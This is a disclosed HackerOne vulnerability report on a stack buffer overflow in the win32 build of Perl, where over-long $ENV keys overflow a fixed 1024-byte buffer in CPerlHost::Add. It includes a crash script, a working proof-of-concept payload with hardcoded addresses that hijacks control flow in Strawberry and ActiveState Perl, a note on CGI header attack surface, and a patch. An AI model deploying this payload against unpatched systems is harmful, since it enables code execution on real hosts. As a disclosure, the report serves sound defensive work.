# Perl $ENV Key Stack Buffer Overflow

## Report Details
- **Report ID**: 272497
- **URL**: https://hackerone.com/reports/272497
- **State**: Closed
- **Severity**: high
- **Submitted**: 2017-09-27T20:49:46.940Z
- **Disclosed**: 2019-11-12T09:39:58.965Z

## Reporter
- **Username**: johnleitch
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: ibb

## Vulnerability Information
The CPerlHost::Add method in win32\perlhost.h is vulnerable to a stack buffer overflow.

void
CPerlHost::Add(LPCSTR lpStr)
{
    char szBuffer[1024];
    LPSTR *lpPtr;
    int index, length = strlen(lpStr)+1;

    for(index = 0; lpStr[index] != '\0' && lpStr[index] != '='; ++index)
    szBuffer[index] = lpStr[index];

    szBuffer[index] = '\0';
    [...]
}

The issue exists because the size of lpStr, the key passed in when indexing into $ENV, is not checked before it is copied into szBuffer, a fixed size stack buffer.

The issue can be reproduced on a win32 build with the following script.

print "Starting\r\n";
$ENV{"A" x (0x1000)} = 0;
print "Done\r\n";

In cases where the $ENV key is exposed as attack surface (such as through CGI-BIN custom HTTP headers), it may be possible for an attacker to achieve arbitrary code execution. The issue was exploited in both Strawberry and Active State Perl, which appear to be compiled without stack canaries or ASLR.

print "Starting\r\n";

$chars =
    "\x41\x41\x41\x41" .
    "\x78\x6e\x3b\x6e" .    # perl526!exit (6E3B6E78)
    "\x43\x43\x43\x43" .
    "\x4e\x1d\x1e\x03" .    # exit code (52305230)
    "\x45\x45\x45\x45" . 
    "\x46\x46\x46\x46" . 
    "\x47\x47\x47\x47" . 
    "\x30\x2c\x3a\x6e";     # perl526!win32_getpid (6e3a2c30)

$ENV{$chars x ((0x400+0x4*0x10) / length $chars)} = 0;

print "Done\r\n";

A proposed patch that validates the length of lpStr follows.

diff --git "a/d:\\source2\\perl-raw\\win32\\perlhost.h" "b/D:\\source2\\perl\\win32\\perlhost.h"
index 84b08c9..665504e 100644
--- "a/d:\\source2\\perl-raw\\win32\\perlhost.h"
+++ "b/D:\\source2\\perl\\win32\\perlhost.h"
@@ -2177,12 +2177,15 @@ compare(const void *arg1, const void *arg2)
 void
 CPerlHost::Add(LPCSTR lpStr)
 {
-    char szBuffer[1024];
+    char szBuffer[2048];
     LPSTR *lpPtr;
     int index, length = strlen(lpStr)+1;
 
     for(index = 0; lpStr[index] != '\0' && lpStr[index] != '='; ++index)
-	szBuffer[index] = lpStr[index];
+        if (index != sizeof(szBuffer) - 1)
+            szBuffer[index] = lpStr[index];
+        else
+            Perl_croak_nocontext("$ENV key too large");
 
     szBuffer[index] = '\0';
 
Note that the buffer size had to be increased to accommodate larger values that were previously causing silent overwrites.

Credit: John Leitch (john@autosectools.com), Bryce Darling (darlingbryce@gmail.com)


## Attachments
No attachments
